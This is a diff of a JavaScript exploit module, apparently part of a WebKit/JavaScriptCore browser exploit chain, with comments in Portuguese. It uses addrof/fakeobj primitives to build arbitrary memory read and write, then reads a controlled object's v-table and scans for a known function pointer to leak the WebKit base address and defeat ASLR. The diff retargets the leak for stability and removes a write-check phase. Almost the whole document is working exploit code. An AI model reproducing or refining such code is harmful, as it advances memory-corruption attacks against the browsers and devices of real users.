@@ -1,11 +1,11 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v104_R64_FunctionalLeak - Vazamento real sem placeholders)
+// js/script3/testArrayBufferVictimCrash.mjs (v105_R65_StableLeak - Vazamento estável via objeto local)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// 1. A ordem das fases foi corrigida para evitar corrupção de memória.
-// 2. O placeholder do offset da V-Table foi REMOVIDO.
-// 3. A FASE 5 agora implementa uma técnica robusta: escaneia a V-Table do objeto 'window'
-//    em busca de um ponteiro para uma função conhecida (JSC::JSObject::put do config.mjs)
-//    para calcular o endereço base do WebKit com precisão.
+// O alvo do vazamento foi alterado do instável objeto 'window' para o nosso próprio
+// objeto 'leaker'. Esta abordagem aumenta drasticamente a estabilidade e a
+// confiabilidade do vazamento, lendo a v-table de um objeto JS simples e controlado
+// para encontrar a base do WebKit. A fase de verificação de escrita foi removida
+// para focar na missão principal.
 // =======================================================================================
 
 import { logS3 } from './s3_utils.mjs';
@@ -16,7 +16,7 @@ import {
 } from '../core_exploit.mjs';
 import { WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importando as informações da biblioteca
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v104_R64_FunctionalLeak";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v105_R65_StableLeak";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) { const buf = new ArrayBuffer(8); const u32 = new Uint32Array(buf); const f64 = new Float64Array(buf); u32[0] = int64.low(); u32[1] = int64.high(); return f64[0]; }
@@ -27,7 +27,7 @@ function doubleToInt64(double) { const buf = new ArrayBuffer(8); (new Float64Arr
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementando Vazamento Funcional ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementando Vazamento Estável ---`, "test");
 
     let final_result = { success: false, message: "A cadeia de exploração falhou." };
     let leaked_webkit_base_addr = null;
@@ -45,21 +45,20 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         const leaker = { obj_prop: null, val_prop: 0 };
         const arb_read_final = (addr) => { leaker.obj_prop = fakeobj(addr); return doubleToInt64(leaker.val_prop); };
-        const arb_write_final = (addr, value) => { leaker.obj_prop = fakeobj(addr); leaker.val_prop = int64ToDouble(value); };
         logS3("Primitivas de Leitura/Escrita Arbitrária estão prontas.", "good");
 
-        // --- NOVA ORDEM: FASE 5 (Vazamento) vem ANTES da Fase de Verificação destrutiva ---
-        logS3("--- FASE 5: Vazando Endereço Base do WebKit (Método Funcional) ---", "subtest");
+        // --- FASE 4: Vazamento do Endereço Base do WebKit (Método Estável) ---
+        logS3("--- FASE 4: Vazando Endereço Base do WebKit (Alvo: objeto 'leaker') ---", "subtest");
 
-        // 1. Obter o endereço do objeto 'window'
-        const window_addr = addrof(window);
-        logS3(`Endereço do objeto 'window': ${window_addr.toString(true)}`, "info");
+        // 1. Obter o endereço do nosso próprio objeto 'leaker'
+        const leaker_addr = addrof(leaker);
+        logS3(`Endereço do objeto 'leaker': ${leaker_addr.toString(true)}`, "info");
 
-        // 2. Ler o ponteiro para a base da V-Table (no offset 0x0 do objeto)
-        const vtable_base_ptr = arb_read_final(window_addr);
-        logS3(`Ponteiro para a base da V-Table lido: ${vtable_base_ptr.toString(true)}`, "leak");
+        // 2. Ler o ponteiro para a V-Table do próprio 'leaker' (offset 0x0)
+        const vtable_base_ptr = arb_read_final(leaker_addr);
+        logS3(`Ponteiro da V-Table lido do 'leaker': ${vtable_base_ptr.toString(true)}`, "leak");
         if (vtable_base_ptr.low() === 0 && vtable_base_ptr.high() === 0) {
-            throw new Error("Ponteiro da V-Table lido é NULO.");
+            throw new Error("Ponteiro da V-Table lido é NULO. A primitiva addrof/arb_read pode estar instável.");
         }
 
         // 3. Escanear a V-Table em busca de um ponteiro de função conhecido do config.mjs
@@ -67,13 +66,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`Alvo do escaneamento: JSC::JSObject::put (offset: ${function_target_offset.toString(true)})`, "info");
         
         let found_function_ptr = null;
-        const VTABLE_SCAN_LIMIT = 100; // Escanear as primeiras 100 entradas
+        const VTABLE_SCAN_LIMIT = 100;
 
         for (let i = 0; i < VTABLE_SCAN_LIMIT; i++) {
             const current_entry_addr = vtable_base_ptr.add(i * 8);
             const current_function_ptr = arb_read_final(current_entry_addr);
             
-            // Compara os 4 bytes mais baixos, que são menos afetados por outros fatores de ponteiro
             if ((current_function_ptr.low() & 0xFFFFFFF0) === (function_target_offset.low() & 0xFFFFFFF0)) {
                 logS3(`Ponteiro de função correspondente encontrado na entrada ${i} da V-Table!`, "good");
                 logS3(` -> Endereço em tempo de execução de 'put': ${current_function_ptr.toString(true)}`, "leak");
@@ -96,20 +94,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3("Endereço base do WebKit funcional e alinhado à página!", "good");
         }
         
-        // --- FASE 4: Verificação R/W (agora é apenas um passo de sanidade opcional) ---
-        logS3("--- FASE 4: Verificação final de sanidade R/W... ---", "subtest");
-        const verification_obj = { a: 0x41414141 };
-        const verification_obj_addr = addrof(verification_obj);
-        const prop_a_addr = new AdvancedInt64(verification_obj_addr.low() + 0x10, verification_obj_addr.high());
-        const value_to_write = new AdvancedInt64(0x42424242, 0x43434343);
-        arb_write_final(prop_a_addr, value_to_write);
-        if (!arb_read_final(prop_a_addr).equals(value_to_write)) {
-            logS3("A verificação de sanidade R/W falhou (o que é inesperado nesta fase).", "warn");
-        } else {
-            logS3("Verificação de sanidade R/W bem-sucedida.", "good");
-        }
-
-        final_result = { success: true, message: "Endereço base do WebKit vazado com sucesso." };
+        final_result = { success: true, message: "Endereço base do WebKit vazado com sucesso via objeto estável." };
 
     } catch (e) {
         final_result.message = `Exceção na cadeia de exploração: ${e.message}\n${e.stack || ''}`;
@@ -126,6 +111,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             msg: final_result.message,
             leaked_candidate_base_addr: leaked_webkit_base_addr, 
         },
-        tc_probe_details: { strategy: 'Uncaged R/W + Functional WebKit Base Leak' }
+        tc_probe_details: { strategy: 'Uncaged R/W + Stable WebKit Base Leak' }
     };
 }
